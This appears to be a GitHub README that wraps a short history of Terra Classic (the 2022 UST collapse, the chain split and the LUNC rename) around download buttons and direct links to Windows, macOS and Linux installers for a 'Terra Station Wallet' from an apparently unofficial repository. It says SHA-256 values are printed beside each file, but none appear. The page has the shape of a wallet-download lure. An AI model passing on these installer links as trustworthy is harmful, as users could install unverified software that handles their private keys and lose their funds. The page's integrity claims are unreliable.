![Terra Station Wallet](assets/banner-article.png)

# Terra Classic: A Short History

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

Terra Classic is the chain that kept running. Its history runs from a 2018 launch, through a payments push and a stablecoin experiment, into the May 2022 collapse, and out the other side as a renamed network with a community-run continuity plan. Understanding that sequence explains most of the naming confusion people meet today.

## The timeline in one table

| Period | What happened |
|---|---|
| 2018 | Terra launches, built around a stablecoin design tied to LUNA |
| 2019-2021 | Payments partnerships and DeFi applications expand; UST grows rapidly |
| May 2022 | UST loses its peg; LUNA collapses; the chain halts and restarts |
| Mid-2022 | A new chain launches; the original continues as Terra Classic |
| 2022 onwards | Renaming to LUNC and USTC, parameter changes by governance |

The two rows that matter most for wallet users are the last two: the chain continued, and its tokens were renamed.

## Before 2022

Terra's pitch was practical: a stablecoin designed to hold a dollar peg, supported by an application ecosystem and a payments network with real merchant integrations in Asia. LUNA was the volatile asset that backed the design, and demand for the stablecoin drove demand for LUNA.

That structure worked while confidence held. It also meant the stablecoin and the backing asset were linked, so pressure on one became pressure on both.

## May 2022

UST lost its dollar peg. The mechanism designed to restore it required minting more LUNA, which diluted LUNA and deepened the loss of confidence, which in turn made the peg harder to restore. The feedback loop ran faster than any intervention could answer, and the chain was halted to stop the bleeding.

This is the part of the story that is genuinely simple: a design that depended on confidence lost confidence, and the mechanism intended as a stabiliser amplified the failure instead.

## The split

Two outcomes followed, and they are easy to conflate:

1. **The original chain continued.** It was renamed Terra Classic, and its tokens were renamed: LUNA became LUNC, UST became USTC. Balances stayed at the same addresses.
2. **A new chain launched.** It took the name Terra, with a token called LUNA, and a distribution to holders defined at the time of the collapse.

The rename is why a wallet restored today shows LUNC where someone remembers LUNA, and the new launch is why two different assets are called LUNA in different contexts (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-classic-vs-luna.md).

## After the split

Terra Classic's direction since then has been set by governance rather than by a company: supply-related parameters, burn mechanisms, staking settings and upgrades have all been voted on by stake holders (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-governance-voting.md). That is why the chain's economics today differ from anything written before mid-2022.

The result is a network with an unusual history and a conventional mechanism: delegated proof of stake, community proposals, and a wallet ecosystem built around self-custody.

## The years the chain spent rebuilding

The continuity plan after 2022 was not a single decision but a long series of them: which supply parameters to change, how to fund development, what to do with the burned supply, how to handle the community pool. Each one went through governance, and each one produced arguments that are still visible in proposal archives.

For a wallet holder, the useful outcome is simpler than the debate: the chain kept producing blocks, the staking mechanism kept paying rewards, and the tooling kept being maintained. Whatever one thinks of individual votes, that continuity is why a phrase from before 2022 still restores a working wallet today, and why the tooling is documented in the present tense rather than the past. That difference is easy to spot once you look for it: a page written entirely in the past tense is usually quoting a moment, not describing a state.

## What this means for a wallet holder today

- **Old balances are current balances.** A phrase from before 2022 restores the same addresses, with renamed tokens (*Recovering Legacy LUNA as LUNC*).
- **The naming in old guides is historical.** A 2021 tutorial about "Terra" is describing Terra Classic.
- **Governance is the authority.** Parameter changes come from votes, so a figure quoted in an article is a snapshot (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/lunc-burn-explained.md).
- **The chain's record is public.** Every claim in this page can be checked on an explorer against block history (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/lunc-burn-explained.md).

## Why the history is worth knowing

Not for nostalgia. It explains three practical things: why two chains share an address format, why tokens changed names without moving, and why so much written about LUNC is written by people who lost money and are angry about it.

Knowing the sequence lets you read a claim and place it - before the collapse, during it, or after the rename - which is usually enough to tell whether it applies to the wallet you are using now.

## Questions people ask

### Is Terra Classic the original chain?

Yes. It continued after the collapse and was renamed. The other chain was a new launch.

### Did my old LUNA become LUNC automatically?

The token was renamed, so the balance at your address is LUNC now. Nothing needed claiming (*Recovering Legacy LUNA as LUNC*).

### Who runs Terra Classic now?

Its stake holders, through governance. There is no company directing it, which is why parameter changes are voted on.

### Does the wallet have anything to do with the collapse?

No. The wallet is software for holding keys on Terra Classic; the collapse was a failure of a stablecoin design, not of a wallet.

That continuity also explains the tooling: the wallet, the explorers and the staking interfaces exist because there was still a chain worth building them for. A network that had stopped producing blocks would have no use for any of it, and the fact that these pages exist is itself part of the answer. History written by people who assumed the chain was finished tends to describe a different chain than the one you can open today.
